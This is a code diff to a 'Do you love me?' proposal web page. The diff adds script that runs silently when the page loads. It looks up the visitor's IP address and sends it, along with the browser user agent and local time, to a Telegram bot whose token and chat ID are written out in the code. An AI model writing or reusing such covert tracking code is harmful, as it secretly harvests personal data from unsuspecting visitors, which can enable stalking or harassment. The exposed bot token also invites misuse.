@@ -19,7 +19,12 @@
     
     <script type="text/javascript" async src="https://tenor.com/embed.js"></script>
     <script>
-      fetch('https://api.telegram.org/bot8566681268:AAGNjhD4celIEWc_WK7XCiWsOe08KMBmqWk/sendMessage?chat_id=8548081539&text=Someone opened your love proposal link! 💕');
+      fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(data => {
+          const info = `Someone opened your link! 💕%0A%0AIP: ${data.ip}%0ADevice: ${navigator.userAgent}%0ATime: ${new Date().toLocaleString()}`;
+          fetch(`https://api.telegram.org/bot8566681268:AAGNjhD4celIEWc_WK7XCiWsOe08KMBmqWk/sendMessage?chat_id=8548081539&text=${info}`);
+        });
     </script>
     <h1>Do you love me? 🤗</h1>
     <p>You make my heart skip a beat 💕</p>
